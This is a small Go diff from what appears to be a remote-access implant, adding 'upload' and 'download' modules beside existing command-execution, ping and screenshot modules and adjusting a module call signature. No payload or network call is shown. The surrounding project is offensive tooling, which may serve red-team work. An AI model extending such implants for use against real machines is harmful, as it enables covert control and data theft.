@@ -149,7 +149,7 @@ func (i *Implant) executeTask(task string) (string, error) {
 	}
 
 	// Execute module command
-	result, err := module.Execute("")
+	result, err := module.Execute("", nil)
 	if err != nil {
 		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
 	}
@@ -253,6 +253,8 @@ func main() {
 	implant.Modules["exec"] = modules.NewExecuteModule()
 	implant.Modules["ping"] = modules.NewPingModule()
 	implant.Modules["screenshot"] = modules.NewScreenshotModule()
+	implant.Modules["upload"] = modules.NewUploadModule()
+	implant.Modules["download"] = modules.NewDownloadModule()
 
 	implant.Start()
 }
